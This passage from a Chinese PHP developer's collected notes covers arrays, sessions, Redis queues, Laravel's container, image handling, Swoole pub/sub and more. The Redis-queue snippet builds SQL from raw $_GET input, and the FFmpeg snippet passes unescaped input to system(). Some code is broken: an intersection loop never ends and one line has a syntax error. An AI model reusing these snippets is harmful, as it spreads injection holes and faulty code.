['future' =&gt; true]); $client-&gt;send($reqs)-&gt;then(function ($response)&#123; dump($response-&gt;json());//["origin" =&gt; "49.7.40.196, 49.7.40.196"] 这个输出在ok之后 &#125;); dump('ok'); 删除数组元素1234567891011121314151617删除数组元素有两种方式，第一种是使用 unset 方法。 unset($arr[1]);此方法删除元素后，$arr[1] 为 null ，所有元素的索引值不变，也就是说元素不会重新排列，所以不是很实用。要使元素删除后重新排列顺序，使用 array_splice 方法即可。 array_splice(array,start,length,array);array_splice 的四个参数中，array 为要删除元素的数组；start 为要开始删除元素的位置（索引值）；length 为要删除的元素数量；最后一个参数为可选参数，允许用一个新元素替代被删除的元素。使用 array_splice 删除数组中索引为1的元素： array_splice($arr,1,1);//重新索引了 不用array_values 如何查Session内容1234567891011121314151617181920212223首先配置Session存储，使用Memcachedsession.save_handler = memcached session.save_path = "localhost:11211" 查看session_id&lt;?phpsession_start();var_dump(session_id());我们希望在Memcached里查询Session内容，怎么确定查询的Key呢？尝试：get vkfc4eefu7ihlu5iv7v3je8rm0 无效，应该这样:get memc.sess.key.vkfc4eefu7ihlu5iv7v3je8rm0原来在使用Memcached存储Session, key前缀是可以配置的。&lt;?phpvar_dump(ini_get('memcached.sess_prefix')); // 'memc.sess.key.'https://php1024.com/posts/50.htm redis队列缓存123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// 加上时间戳存入队列$now_time = date("Y-m-d H:i:s");$redis-&gt;rPush("call_log", $_GET['info'] . "%" . $now_time);$redis-&gt;close();// init redis$redis_xx = new Redis();$redis_xx-&gt;connect('ip', port);$redis_xx-&gt;auth("password");// 获取现有消息队列的长度$count = 0;$max = $redis_xx-&gt;lLen("call_log");// 获取消息队列的内容，拼接sql$insert_sql = "insert into fb_call_log (`interface_name`, `createtime`) values ";// 回滚数组$roll_back_arr = array();while ($count &lt; $max) &#123; $log_info = $redis_cq01-&gt;lPop("call_log"); $roll_back_arr = $log_info; if ($log_info == 'nil' || !isset($log_info)) &#123; $insert_sql .= ";"; break; &#125; // 切割出时间和info $log_info_arr = explode("%",$log_info); $insert_sql .= " ('".$log_info_arr[0]."','".$log_info_arr[1]."'),"; $count++;&#125;// 判定存在数据，批量入库if ($count != 0) &#123; $link_2004 = mysql_connect('ip:port', 'user', 'password'); if (!$link_2004) &#123; die("Could not connect:" . mysql_error()); &#125; $crowd_db = mysql_select_db('fb_log', $link_2004); $insert_sql = rtrim($insert_sql,",").";"; $res = mysql_query($insert_sql); // 输出入库log和入库结果; echo date("Y-m-d H:i:s")."insert ".$count." log info result:"; echo json_encode($res); echo "&lt;/br&gt;\n"; // 数据库插入失败回滚 if(!$res)&#123; foreach($roll_back_arr as $k)&#123; $redis_xx-&gt;rPush("call_log", $k); &#125; &#125; // 释放连接 mysql_free_result($res); mysql_close($link_2004);&#125;http://cuihuan.net/2017/01/20/%E3%80%90%E9%AB%98%E5%B9%B6%E5%8F%91%E7%AE%80%E5%8D%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91redis%E9%98%9F%E5%88%97%E7%BC%93%E5%AD%98%20+%20mysql%20%E6%89%B9%E9%87%8F%E5%85%A5%E5%BA%93%20+%20php%E7%A6%BB%E7%BA%BF%E6%95%B4%E5%90%88/ laravel服务容器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108class UserStatsCsvExporter implements UserStatsExporterContract&#123; public function export(int $userId) &#123; // Load user statistics... // Export file... &#125;&#125;在控制器中，我们会 new 一个类，然后调用里面的 export 方法。class ExportController extends Controller&#123; public function handle() &#123; $userStatsExporter = new UserStatsCsvExporter(); return $userStatsExporter-&gt;export(12); &#125; public function handle2(UserStatsCsvExporter $userStatsExporter) &#123; return $userStatsExporter-&gt;export(12); &#125;&#125;class UserStatsCsvExporter implements UserStatsExporterContract&#123; /** @var Translator */ private $translator; public function __construct(Translator $translator) &#123; $this-&gt;translator = $translator; &#125; public function export(int $userId) &#123; // Load user statistics... // Export file... &#125;&#125;class Translator&#123; /** @var string */ private $language; public function __construct(string $language) &#123; $this-&gt;language = $language; &#125; public function translate(string $word) &#123; // Translate word... &#125;&#125;class UserStatsExporterProvider extends ServiceProvider&#123; public function register() &#123; $this-&gt;app-&gt;bind(UserStatsCsvExporter::class, function() &#123; return new UserStatsCsvExporter(new Translator(config('app.locale'))); &#125;); &#125;&#125;绑定到接口public function handle(UserStatsXmlExporter $userStatsExporter)&#123; return $userStatsExporter-&gt;export(12);&#125;public function register()&#123; $this-&gt;app-&gt;bind(UserStatsXmlExporter::class, function() &#123; return new UserStatsXmlExporter(new Translator(config('app.locale')) &#125;);&#125;public function handle(UserStatsExporterContract $userStatsExporter)&#123; return $userStatsExporter-&gt;export(12);&#125;要让上面代码工作，我们还需要改动服务提供者的代码。public function register()&#123; $this-&gt;app-&gt;bind(UserStatsExporterContract::class, function() &#123; return new UserStatsXmlExporter(new Translator(config('app.locale'))); &#125;);&#125;public function handle(UserStatsExporterContract $userStatsExporter)&#123; dd(app(UserStatsExporterContract::class), app(UserStatsExporterContract::class)); return $userStatsExporter-&gt;export(12);&#125;使用 singleton 来替换 bind 方法即可。public function register()&#123; $this-&gt;app-&gt;singleton(UserStatsExporterContract::class, function() &#123; return new UserStatsXmlExporter(new Translator(config('app.locale'))); &#125;);&#125;https://learnku.com/articles/32333 反射动态代理1234567891011121314151617181920212223242526272829303132class mysql&#123; function connect($db)&#123; echo "连接到数据库$&#123;db[0]&#125;\r\n"; &#125;&#125;class sqlproxy&#123; private $target; function __construct($tar) &#123; $this-&gt;target[]=new $tar(); &#125; function __call($name, $args) &#123; foreach ($this-&gt;target as $obj) &#123; $r=new ReflectionClass($obj); if ($method= $r-&gt;getMethod($name)) &#123; if ($method-&gt;isPublic() &amp;&amp; !$method-&gt;isAbstract()) &#123; echo "方法前拦截记录LOG\r\n"; $method-&gt;invoke($obj,$args); echo "方法后拦截\r\n"; &#125; &#125; &#125; &#125;&#125;$obj=new sqlproxy('mysql');$obj-&gt;connect('member');方法前拦截记录LOG连接到数据库member方法后拦截https://learnku.com/articles/32943 安装12345678910111213141516171819202122232425262728293031323334353637383940https://pecl.php.net/package/imagick #wget http://pecl.php.net/get/imagick-3.4.4.tgz#tar -xzvf imagick-3.4.4.tgz#cd imagick-3.4.4#phpize#./configure --with-php-config=/php7/bin/php-config --with-imagick=/usr/local/imagemagickchecking Testing /usr/bin/Wand-config... Doesn't existchecking Testing /usr/sbin/bin/MagickWand-config... Doesn't existchecking Testing /usr/sbin/bin/Wand-config... Doesn't existchecking Testing /opt/bin/MagickWand-config... Doesn't existchecking Testing /opt/bin/Wand-config... Doesn't existchecking Testing /opt/local/bin/MagickWand-config... Doesn't existchecking Testing /opt/local/bin/Wand-config... Doesn't existconfigure: error: not found. Please provide a path to MagickWand-config or Wand-config program. #yum install ImageMagick-devel -y # ./configure --with-php-config=/php7/bin/php-config --with-imagick=/usr/local/imagemagick checking whether stripping libraries is possible... yes checking if libtool supports shared libraries... yes checking whether to build shared libraries... yes checking whether to build static libraries... no creating libtool appending configuration tag "CXX" to libtool configure: creating ./config.status config.status: creating config.h#make &amp;&amp; make install Build complete.Don't forget to run 'make test'.Installing shared extensions: /php7/lib/php/extensions/no-debug-zts-20151012/Installing header files: /php7/include/php/php7 --iniConfiguration File (php.ini) Path: /opt/php7/etc/Loaded Configuration File: /opt/php7/etc/php.iniScan for additional .ini files in: (none)Additional .ini files parsed: (none) #vi php.ini extension=/opt/php7/lib/php/extensions/no-debug-zts-20151012/imagick.so phpstorm gitbash1234567891011打开 PHPStorm 的设置，定位到 Tools -&gt; Terminal将 Shell Path 选项改为 &#123;git 安装目录&#125;\bin\sh.exe，重新打开终端，可以看到已切换成了 git bash另外 git bash 可能会出现中文乱码的问题，需要在 Git 的安装目录下找到 ./etc/bash.bashrc 文件，在末尾添加：$ vim ./etc/bash.bashrc# support chineseexport LANG="zh_CN.UTF-8"export LC_ALL="zh_CN.UTF-8"https://learnku.com/articles/32981 composer 找不到文件1234567891011 findClasses 函数中，有这么一个去除代码中 heredoc 或 nowdoc 的操作：// strip heredocs/nowdocs$contents = preg_replace('&#123;&lt;&lt;&lt;[ \t]*([\'"]?)(\w+)\\1(?:\r\n|\n|\r)(?:.*?)(?:\r\n|\n|\r)(?:\s*)\\2(?=\s+|[;,.)])&#125;s', 'null', $contents);问题就出在这个正则。对于内容比较长的类源文件，这个正则替换可能会直接报错返回 null，这样就导致 composer 无法识别出该类，从而你的应用中就会报类不存在的错误。通过调用 preg_last_error () 函数可以获取正则错误代码。我这里返回的错误代码为 2，也就是 PREG_BACKTRACK_LIMIT_ERROR，意思是回溯限制错误。这个错误受 php 配置影响，可以把 pcre.backtrack_limit 参数设置更大或者直接设置成 - 1 不受限制（可能会造成性能问题，谨慎操作）。这也是前面提到的为什么有的机器上正常，有的机器上又不正常，原因就在于这个配置不同。OK，到此弄清楚是什么原因了。解决办法：1、可以将 pcre.backtrack_limit 参数设置大点再试试 2、看是否能减小类源文件中 heredocs/nowdocs 字符串的大小。此处我的解决办法是直接把这个超长 heredocs 字符串独立到 sql 文件中，代码中读取文件内容即可。https://learnku.com/articles/32972 分组查询1234567891011121314151617181920select `u`.`id`,`u`.`name`,`u`.`num` from `users` as `u` left join (select `user_id`,count(*) as `num` from books group by `user_id`) as `b` on `u`.id = `b`.user_id 查询每个人的书数量select distinct `u`.`id`,`u`.`name`,IFNULL( `b`.`num`, 0 ) AS num from `users` as `u` left join (select `user_id`,count(*) as `num` from books group by `user_id`) as `b` on `u`.id = `b`.user_id //统计出所有内部员工的user_id $user_ids = [1,2,3,4,5]; $bookQuery = Book::selectRaw('user_id,count(*) as number')-&gt;whereIn('user_id', $user_ids)-&gt;groupBy('user_id'); //制作一个query builder $users = User::selectRaw('u.id,IFNULL( b.number, 0 ) AS number') -&gt;from('users as u') -&gt;distinct() -&gt;whereIn('id', $user_ids) -&gt;leftJoin(\DB::raw("(&#123;$bookQuery-&gt;toSql()&#125;) as b"),function ($join) use($bookQuery)&#123; //toSql()返回的是等待绑定参数的SQL语句 $join-&gt;mergeBindings($bookQuery-&gt;getQuery())-&gt;on('u.id','=','b.user_id'); //mergeBindings是将SQl的参数进行绑定 &#125;) -&gt;get();https://www.guaosi.com/2019/03/19/laravel-with-limit-and-group-show-zero/ 取k个不重复的数123456789101112131415161718192021222324252627282930function getRandomN($max, $num) &#123; $count = 0; $return = array(); while ($count &lt; $num) &#123; $return[] = mt_rand(0, $max); $return = array_flip(array_flip($return)); $count = count($return); &#125; shuffle($return); return $return;&#125;return getRandomN(20, 10);// output:[7,14,6,12,3,4,15,0,16,10]function getRandomN($num, $n)&#123; $startArray = range(0, $num); $resultArray = []; for($i = 0; $i &lt; $n; $i++) &#123; $random = mt_rand(0, $num - $i); $resultArray[$i] = $startArray[$random]; $startArray[$random] = $startArray[$num - $i - 1]; &#125; return $resultArray;&#125;return getRandomN(20, 10);https://alpha2016.github.io/2019/04/09/PHP%E4%BB%8E0-n%E4%B9%8B%E9%97%B4%E9%9A%8F%E6%9C%BA%E5%8F%96k%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0/ Intervention Image 库处理图片1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374composer require intervention/image// 包含autoload文件require 'vendor/autoload.php';// 导入ImageManager类use Intervention\Image\ImageManager;// 创建ImageManager实例并指定要使用的驱动(默认GD库)$manager = new ImageManager(array('driver' =&gt; 'imagick'));// 创建Image实例然后操作图片$image = $manager-&gt;make('public/foo.jpg')-&gt;resize(300, 200);// 创建一个Image对象$img = Image::make('public/foo.jpg');// 获取图片文件大小$size = $img-&gt;filesize();// 获取图片尺寸（像素）$width = $img-&gt;width();$height = $img-&gt;height();// 调整图片尺寸$img-&gt;resize(300, 200);// 调整图片的宽或高$img-&gt;resize(300, null);$img-&gt;resize(null, 200);// 调整图片的宽同时保持图片比例$img-&gt;resize(300, null, function ($constraint) &#123; $constraint-&gt;aspectRatio();&#125;);// 调整图片的高同时保持图片比例$img-&gt;resize(null, 200, function ($constraint) &#123; $constraint-&gt;aspectRatio();&#125;);// 避免处理时造成文件大小增加$img-&gt;resize(null, 400, function ($constraint) &#123; $constraint-&gt;aspectRatio(); $constraint-&gt;upsize();&#125;);// 转码为其他格式并压缩图片$img-&gt;encode('jpg', 75);// 转码为 Data URL$img-&gt;encode('data-url');// 裁剪图片$img-&gt;crop(100, 100, 25, 25);// 旋转-45度$img-&gt;rotate(-45);// 垂直翻转及水平翻转$img-&gt;flip('v');$img-&gt;flip('h');// 以最优方案裁剪为600*360$img-&gt;fit(600, 360);// 以最优方案裁剪为200*200$img-&gt;fit(200);// 以默认质量保存图片$img-&gt;save('public/bar.jpg');// 以给定质量保存图片$img-&gt;save('public/bar.png', 60);https://yiming.blog/article/201702121305.html Redis PubSub实现简单消息推送12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;swoole chat room&lt;/title&gt; &lt;meta charset="UTF-8"&gt; &lt;script type="text/javascript"&gt; if(window.WebSocket)&#123; // 端口和ip地址对应不要写错 var webSocket = new WebSocket("ws://127.0.0.1:9502"); webSocket.onopen = function (event) &#123; //webSocket.send("Hello,WebSocket!"); &#125;; webSocket.onmessage = function (event) &#123; var content = document.getElementById('content'); content.innerHTML = content.innerHTML.concat('&lt;p style="margin-left:20px;height:20px;line-height:20px;"&gt;'+event.data+'&lt;/p&gt;'); &#125; var sendMessage = function()&#123; var data = document.getElementById('message').value; webSocket.send(data); &#125; &#125;else&#123; console.log("您的浏览器不支持WebSocket"); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div style="width:600px;margin:0 auto;border:1px solid #ccc;"&gt; &lt;div id="content" style="overflow-y:auto;height:300px;"&gt;&lt;/div&gt; &lt;hr/&gt; &lt;div style="height:40px"&gt; &lt;input type="text" id="message" style="margin-left:10px;height:25px;width:450px;"&gt; &lt;button onclick="sendMessage()" style="height:28px;width:75px;"&gt;发送&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php$server = new swoole_websocket_server("0.0.0.0", 9502);$server-&gt;on('workerStart', function ($server, $workerId) &#123; $client = new swoole_redis; $client-&gt;on('message', function (swoole_redis $client, $result) use ($server) &#123; if ($result[0] == 'message') &#123; var_dump($result); foreach($server-&gt;connections as $fd) &#123; $server-&gt;push($fd, '频道为： ' $result[1] . ' 发送消息：' . $result[2]); &#125; &#125; &#125;); $client-&gt;connect('127.0.0.1', 6379, function (swoole_redis $client, $result) &#123; $client-&gt;subscribe('message'); // 队列名称可以自定义 &#125;);&#125;);$server-&gt;on('open', function ($server, $request) &#123; $server-&gt;push($request-&gt;fd, "hello;\n");&#125;);// 屏蔽这段会报错 $server-&gt;on('message', function (swoole_websocket_server $server, $request) &#123; $server-&gt;push($request-&gt;fd, "hello");&#125;);$server-&gt;on('close', function ($server, $fd) &#123; echo "client-&#123;$fd&#125; is closed\n"; $server-&gt;close($fd);&#125;);$server-&gt;start(); https://alpha2016.github.io/2019/02/16/PHP,Swoole,Redis-PubSub%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E6%B6%88%E6%81%AF%E6%8E%A8%E9%80%81/ FFmpeg 截取视频12345678910111213141516//获取文件路径fwrite(STDOUT, "哪个视频文件:");$video_path = trim(fgets(STDIN));fwrite(STDOUT, "多少秒截取1张图:");$s = trim(fgets(STDIN));//设置输出路径fwrite(STDOUT, "输出到哪里:");$export_path = trim(fgets(STDIN));$command = system('ffmpeg -y -i '.$video_path.' -vf "fps=1/'.$s.',scale=iw/4:-1,tile=2x2" -an '.$export_path.'_%d.png'); // fps = 1/2 每2秒截一张图,如果是每秒截一张 参数就是 fps=1// scale 截图大小,上面的代码是设置宽为原始的1/4大小,高度自动,也可以设置成固定值如:120:80// tile 网格化,自动将100张图合并成一张大图 https://learnku.com/laravel/t/33066 求两个集合的交集123456789101112131415161718192021222324252627282930313233$m = [1, 2, 3, 4];$n = [1, 4, 7, 9];$intersection = [];foreach ($m as $m_v) &#123; foreach ($n as $n_v) &#123; if ($m_v === $n_v) &#123; $intersection = $m_v;//4 &#125; &#125;&#125;$m = [1, 2, 3, 4];$n = [1, 4, 7, 9];$intersection = [];// 获取两个数组的长度$length_m = count($m);$length_n = count($n);// 定义两个指针$i = $j = 0;$intersection = [];while ($i &lt; $length_m &amp;&amp; $j &lt; $length_n) &#123; if ($m[$i] === $n[$j]) &#123; $intersection[] = $m[$i]; &#125; else if ($m[$i] &lt; $n[$j]) &#123; $i++; &#125; else &#123; $j++; &#125;&#125;https://www.hanjiaxin.com/2018/12/13/algorithm-1/ 无限级分类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209&amp; 引用赋值function doloop1(&amp;$i = 1)&#123; print_r($i); $i++; if ($i &lt;= 10) &#123; doloop1($i); &#125;&#125;doloop1();static 静态变量function doloop2()&#123; static $i = 1; print_r($i); $i++; if ($i &lt;= 10) &#123; doloop2(); &#125;&#125;doloop2();global 全局变量$i = 1;function doloop3()&#123; global $i; echo $i; $i++; if ($i &lt;= 10) &#123; doloop3(); &#125;&#125;doloop3(); $data = [ ['id' =&gt; 1, 'title' =&gt; 'Electronics', 'parent_id' =&gt; 0], ['id' =&gt; 2, 'title' =&gt; 'Laptops &amp; PC', 'parent_id' =&gt; 1], ['id' =&gt; 3, 'title' =&gt; 'Laptops', 'parent_id' =&gt; 2], ['id' =&gt; 4, 'title' =&gt; 'PC', 'parent_id' =&gt; 2], ['id' =&gt; 5, 'title' =&gt; 'Cameras &amp; photo', 'parent_id' =&gt; 1], ['id' =&gt; 6, 'title' =&gt; 'Camera', 'parent_id' =&gt; 5], ['id' =&gt; 7, 'title' =&gt; 'Phones &amp; Accessories', 'parent_id' =&gt; 1], ['id' =&gt; 8, 'title' =&gt; 'Smartphones', 'parent_id' =&gt; 7], ['id' =&gt; 9, 'title' =&gt; 'Android', 'parent_id' =&gt; 8], ['id' =&gt; 10, 'title' =&gt; 'iOS', 'parent_id' =&gt; 8], ['id' =&gt; 11, 'title' =&gt; 'Other Smartphones', 'parent_id' =&gt; 8], ['id' =&gt; 12, 'title' =&gt; 'Batteries', 'parent_id' =&gt; 7], ['id' =&gt; 13, 'title' =&gt; 'Headsets', 'parent_id' =&gt; 7], ['id' =&gt; 14, 'title' =&gt; 'Screen Protectors', 'parent_id' =&gt; 7], ]; /** * 值引用获取无限极分类树 * * @param array $data * @return array */function make_tree($data)&#123; $refer = array(); $tree = array(); foreach($data as $k =&gt; $v)&#123; $refer[$v['id']] = &amp; $data[$k]; //创建主键的数组引用 &#125; foreach($data as $k =&gt; $v)&#123; $parent_id = $v['parent_id']; //获取当前分类的父级id if($parent_id == 0)&#123; $tree[] = &amp; $data[$k]; //顶级栏目 &#125;else&#123; if(isset($refer[$parent_id]))&#123; $refer[$parent_id]['children'][] = &amp; $data[$k]; //如果存在父级栏目，则添加进父级栏目的子栏目数组中 &#125; &#125; &#125; return $tree; &#125;/** * 递归获取无限极分类树 * * @param array $data * @param int $parent_id * @param int $level * @return array */function make_tree2($data = [], $parent_id = 0, $level = 0)&#123; $tree = []; if ($data &amp;&amp; is_array($data)) &#123; foreach ($data as $v) &#123; if ($v['parent_id'] == $parent_id) &#123; $tree[] = [ 'id' =&gt; $v['id'], 'level' =&gt; $level, 'title' =&gt; $v['title'], 'parent_id' =&gt; $v['parent_id'], 'children' =&gt; make_tree2($data, $v['id'], $level + 1), ]; &#125; &#125; &#125; return $tree;&#125;获取子节点以及节点的层级/** * 引用赋值方式 * @param array $data * @param int $id * @param int $level * @return array */function getSubTree($data = [], $id = 0, $level = 0)&#123; static $tree = []; foreach ($data as $key =&gt; $value) &#123; if ($value['parent_id'] == $id) &#123; $value['laravel'] = $level; $tree[] = $value; getSubTree($data, $value['id'], $level + 1); &#125; &#125; return $tree;&#125;/** * 静态变量方式 * @param array $data * @param int $id * @param int $level * @return array */function getSubTree($data = [], $id = 0, $level = 0)&#123; static $tree = []; foreach ($data as $key =&gt; $value) &#123; if ($value['parent_id'] == $id) &#123; $value['laravel'] = $level; $tree[] = $value; getSubTree($data, $value['id'], $level + 1); &#125; &#125; return $tree;&#125;/** * 全局变量方式 * @param array $data * @param int $id * @param int $level * @return array */$tree = []; //先申明变量function getSubTree($data = [], $id = 0, $level = 0)&#123; global $tree; foreach ($data as $key =&gt; $value) &#123; if ($value['parent_id'] == $id) &#123; $value['laravel'] = $level; $tree[] = $value; getSubTree($data, $value['id'], $level + 1); &#125; &#125; return $tree;&#125;通过 pid 获取所有上级分类 常用于面包屑导航/** * getParentsByParentId2($categories, 9) * * @param array $data * @param $parent_id * @return array */function getParentsByParentId($data = [], $parent_id)&#123; static $categories = []; if ($data &amp;&amp; is_array($data)) &#123; foreach ($data as $item) &#123; if ($item['id'] == $parent_id) &#123; $categories[] = $item; getParentsByParentId($data, $item['parent_id']); &#125; &#125; &#125; return $categories;&#125;function getParentsByParentId2($data = [], $parent_id)&#123; $categories = []; if ($data &amp;&amp; is_array($data)) &#123; foreach ($data as $item) &#123; if ($item['id'] == $parent_id) &#123; $categories[] = $item; $categories = array_merge($categories, getParentsByParentId2($data, $item['parent_id'])); &#125; &#125; &#125; return $categories;&#125;https://learnku.com/articles/28252 MVC 的 “拓展 “模式123我们把 model 当成 Eloquent class，用一个处理数据库逻辑的 Repository 来辅助它，同样对于 controller 来言，它也有一个辅助它的功臣，那就是能处理商业逻辑 Service，这样就解决了臃肿的问题，view 呢？我们是不是忽略了它，并不是的，它也有属于它的处理显示逻辑的 Presenter。由于 SOLID 的单一职责原则与依赖反转原则：我们将数据库逻辑从 model 分离出来，由 repository 辅助 model，将 model 依赖注入进 repository。同样我们将商业逻辑从 controller 分离出来，由 service 辅助 controller，将 service 依赖注入进 controller。显示逻辑也从 view 分离出来，由 presenter 辅助 view，将 presenter 依赖注入进 view。这样写就避免了臃肿和后期维护的不方便。https://learnku.com/articles/33413 window composer reuqire123456composer require "overtrue/laravel-wechat:~4.0" 实测 Linux 安装 PHP 扩展 pcntl 也可解决。如使用 Windows，可composer.json 中增加以下两个字段 config（安装 ext-posix 和 ext-pcntl 的 php7.2 版本扩展）"platform": &#123; "ext-pcntl": "7.2", "ext-posix": "7.2"&#125;https://learnku.com/laravel/t/33416 位非运算123456789101112131415161718192021222324252627echo ~48&amp;~75;/** * 最好了解下二进制的四则运算和位运算以及运算电路的相关涉及知识^_^ * 48的二进制值是：00110000 十六进制值是：ffffff30【我系统是64位的输出的结果就是这样】 * 其实呢计算机内存在存储数据的时候会把负数转换为补码存储【正数的原码，反码，补码完全一样】 * 而负数呢最高位为1用于表示负数，它的反码呢和正数是相反的，需要将0转换为1，1转换为0，补码操作就是加1操作 * 当然不同位数的内存长度不一样 * * 75的二进制值是：01001011[我按8位算] 【如果是16位的就是：11111111 01001011，32位，64位的也是同样的道理】 * echo ~48;//结果为-49 * //1、转换为二进制时结果为：00110000【64位系统十六进制就是ffffff30】 * //2、此时反码为：11001111【64位系统十六进制就是ffffffcf】 * //3、减1操作为：11001110 【64位系统十六进制就是ffffffce】【11111111 11111111 11111111 11001110】 * //4、还原为：00110001【64位系统十六进制就是80000031】【二进制为：10000000 00000000 00000000 00110001】 * //5、二进制求和结果为：1+16+32=49【注意二进制的最高位1表示负数】输出的结果是：-49 * * echo ~75;//结果为-76，一样的套路 * * echo ~48&amp;~75;//结果却是124 * 1、48的反码结果为：1100 1111 * 2、75的的码结果为：1011 0100 * 3、它们俩相与结果为：1000 0100 【十六进制为：ffffff84】【减1操作后为ffffff83】【自己想想十六进制如何数数^_^】 * 4、还原后为：0111 1100【十六进制为：8000007c】【二进制结果为：10000000 00000000 00000000 01111100】 * 5、求和结果为：-124 */它的结果是：-124 https://learnku.com/articles/33382 php html to pdf image1234567891011121314151617181920212223242526272829303132333435git clone https://github.com/krakjoe/wkhtmltoxcd wkhtmltoxphpize// 这里因为每个人安装环境不一样 /path/to/wkhtmltox/installation 请将这个地址替为wkhtmltox真实的安装路径 /// PATH 替换为真实的php配置路径./configure --with-wkhtmltox=/path/to/wkhtmltox/installation --with-php-config = PATHmakemake install将生成的 wkhtmltox.so 添加到 php.ini 的配置中，重启 phpuse wkhtmltox\PDF\Converter as PDFConverter;use wkhtmltox\PDF\Object as PDFObject;$converter = new PDFConverter([ "out" =&gt; "test.pdf"]);$converter-&gt;add(new PDFObject( file_get_contents("http://www.baidu.com")));$converter-&gt;convert();use wkhtmltox\Image\Converter as ImageConverter;// 这里第一个参数可以传入 ` html ` 的字符串$converter = new ImageConverter(null, [ "fmt" =&gt; "png", "in" =&gt; "http://www.baidu.com", "out" =&gt; "test.png"]);$converter = new ImageConverter($str, [ "fmt" =&gt; "jpg", "out" =&gt; "test.jpg"]);$converter-&gt;convert();https://learnku.com/articles/13472/teach-you-how-to-use-php-to-generate-pdf-and-image-gracefully 控制反转，依赖注入123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159// 定义写日志的接口规范interface Log&#123; public function write(); &#125;// 文件记录日志class FileLog implements Log&#123; public function write()&#123; echo 'file log write...'; &#125; &#125;// 数据库记录日志class DatabaseLog implements Log&#123; public function write()&#123; echo 'database log write...'; &#125; &#125;// 程序操作类class User &#123; protected $fileLog; public function __construct() &#123; $this-&gt;fileLog = new FileLog(); &#125; public function login() &#123; // 登录成功，记录登录日志 echo 'login success...'; $this-&gt;fileLog-&gt;write(); &#125;&#125;$user = new User();$user-&gt;login();class User &#123; protected $log; public function __construct(Log $log) &#123; $this-&gt;log = $log; &#125; public function login() &#123; // 登录成功，记录登录日志 echo 'login success...'; $this-&gt;log-&gt;write(); &#125;&#125;$user = new User(new DatabaseLog());$user-&gt;login();// routes/web.phpRoute::get('/post/store', 'PostController@store');// App\Http\Controllersclass PostController extends Controller &#123; public function store(Illuminate\Http\Request $request) &#123; $this-&gt;validate($request, [ 'category_id' =&gt; 'required', 'title' =&gt; 'required|max:255|min:4', 'body' =&gt; 'required|min:6', ]); &#125;&#125;// 获取User的reflectionClass对象$reflector = new reflectionClass(User::class);// 拿到User的构造函数$constructor = $reflector-&gt;getConstructor();// 拿到User的构造函数的所有依赖参数$dependencies = $constructor-&gt;getParameters();// 创建user对象$user = $reflector-&gt;newInstance();// 创建user对象，需要传递参数的$user = $reflector-&gt;newInstanceArgs($dependencies = []);这时候我们可以创建一个 make 方法，传入 User，利用反射机制拿到 User 的构造函数，进而得到构造函数的参数对象。用递归的方式创建参数依赖。最后调用 newInstanceArgs 方法生成 User 实例。 可能有些同学还不是很理解。下面我们用代码去简单模拟下function make($concrete)&#123; // 或者User的反射类 $reflector = new ReflectionClass($concrete); // User构造函数 $constructor = $reflector-&gt;getConstructor(); // User构造函数参数 $dependencies = $constructor-&gt;getParameters(); // 最后生成User return $reflector-&gt;newInstanceArgs($dependencies);&#125;$user = make('User');$user-&gt;login();// 注意我们这里需要修改一下User的构造函数，如果不去修改。反射是不能动态创建接口的，那如果非要用接口该怎么处理呢？下一节我们讲Ioc容器的时候会去解决。class User &#123; protected $log; public function __construct(FileLog $log) &#123; $this-&gt;log = $log; &#125; public function login() &#123; // 登录成功，记录登录日志 echo 'login success...'; $this-&gt;log-&gt;write(); &#125;&#125;function make($concrete)&#123; $reflector = new ReflectionClass($concrete); $constructor = $reflector-&gt;getConstructor(); // 为什么这样写的? 主要是递归。比如创建FileLog不需要传入参数。 if(is_null($constructor)) &#123; return $reflector-&gt;newInstance(); &#125;else &#123; // 构造函数依赖的参数 $dependencies = $constructor-&gt;getParameters(); // 根据参数返回实例，如FileLog $instances = getDependencies($dependencies); return $reflector-&gt;newInstanceArgs($instances); &#125;&#125;function getDependencies($paramters) &#123; $dependencies = []; foreach ($paramters as $paramter) &#123; $dependencies[] = make($paramter-&gt;getClass()-&gt;name); &#125; return $dependencies;&#125;$user = make('User');$user-&gt;login();https://www.tinker777.com/show/12 英文字符占 0.5 个，中文字符占 1 个12345678910111213141516171819202122232425// 计算单字节. preg_match_all('/[a-zA-Z0-9_]/', $value, $single); $single = count($single[0]) / 2; // 多子节长度. $double = mb_strlen(preg_replace('([a-zA-Z0-9_])', '', $value)); $length = $single + $double; function str_display_len (string $str) &#123; preg_match_all('/[a-zA-Z0-9_]/', $str, $single); return count($single[0]) / 2 + mb_strlen(preg_replace('([a-zA-Z0-9_])', '', $str)); &#125;function the_fucking_length_function($str)&#123; return strlen(mb_convert_encoding($str, 'GB2312')) / 2; //$length = (strlen($value) + mb_strlen($value)) / 2;&#125;function mbstrlen($str) &#123; return ceil((strlen($str) + mb_strlen($str, "UTF8")) / 2);&#125; mb_strwidth ('中国123','utf-8')//7https://learnku.com/articles/4956/following-my-unique-needs-of-the-english-characters-accounted-for-05-chinese-characters-accounted-for-1https://www.php.net/manual/zh/function.mb-strwidth.php 支付宝 App 第三方登录获取 用户信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/** * AlipayToken 获得用户 请求token, 通过它获得 用户信息 * * 需要按照支付宝加签流程来。 */ public function 